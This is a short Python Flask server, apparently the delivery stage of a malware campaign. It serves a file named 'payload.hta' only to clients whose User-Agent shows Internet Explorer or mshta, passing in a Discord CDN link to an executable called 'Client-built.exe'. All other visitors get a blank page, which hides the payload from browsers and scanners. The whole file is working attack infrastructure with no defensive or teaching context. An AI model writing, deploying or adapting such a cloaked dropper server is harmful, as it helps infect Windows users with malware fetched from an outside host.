import os
from flask import Flask, request, render_template_string

app = Flask(__name__)
PORT = int(os.environ.get("PORT", 8000))

LIVE_DISCORD_LINK = "https://cdn.discordapp.com/attachments/1522962798030753815/1524005183841894481/Client-built.exe?ex=6a4e2bee&is=6a4cda6e&hm=54462c8b75e6802a68969e986c9dcfc2a10b554768136bf49cee46fe62f85640&"

@app.route('/')
def handle_request():
    user_agent = request.headers.get('User-Agent', '')
    
    if "Trident" in user_agent or "mshta" in user_agent.lower():
        with open("payload.hta", "r") as f:
            hta_content = f.read()
        return render_template_string(hta_content, DISCORD_LINK=LIVE_DISCORD_LINK)
    else:
        return "<html><head></head><body></body></html>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
